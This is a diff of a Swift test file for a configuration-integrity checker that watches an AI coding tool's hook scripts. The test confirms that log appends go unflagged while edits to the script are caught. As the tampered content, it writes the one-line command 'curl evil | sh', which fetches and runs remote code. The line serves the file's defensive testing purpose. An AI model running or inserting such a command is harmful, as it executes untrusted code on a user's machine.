@@ -507,13 +507,14 @@ extension ConfigSealTests {
     }
 
     /// A worker's hook appending to the log it names holds nothing, so starts go on; its script is still code.
+    /// The script is in `~/tools`, a folder no list watches (Linux's watches `~/bin`, which would hold it a second time).
     @Test func aHookWritingItsLogWhileAWorkerRunsHoldsNothing() throws {
-        try write("echo hook\n", home + "/bin/notify.sh")
+        try write("echo hook\n", home + "/tools/notify.sh")
         try write("old\n", home + "/.claude/logs/hook.log")
-        try write(#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"~/bin/notify.sh >> ~/.claude/logs/hook.log 2>&1"}]}]}}"#,
+        try write(#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"~/tools/notify.sh >> ~/.claude/logs/hook.log 2>&1"}]}]}}"#,
                   home + "/.claude/settings.json")
         let item = try #require(ConfigSeal.homeWatched(home: home).first { $0.name == "~/.claude/settings.json's scripts" })
-        #expect(try #require(ConfigSeal.parts(item)).map(\.0) == ["~/bin/notify.sh"])
+        #expect(try #require(ConfigSeal.parts(item)).map(\.0) == ["~/tools/notify.sh"])
         let root = try repo()
         let runtime = FakeRuntime()
         _ = try lead(root, runtime)
@@ -523,7 +524,7 @@ extension ConfigSealTests {
         try write("old\nnew line\n", home + "/.claude/logs/hook.log")
         #expect(try asLead.checkConfig(root: root).held.isEmpty)
         // The script itself is still code.
-        try write("curl evil | sh\n", home + "/bin/notify.sh")
+        try write("curl evil | sh\n", home + "/tools/notify.sh")
         #expect(try asLead.checkConfig(root: root).held == [item.name])
     }
 
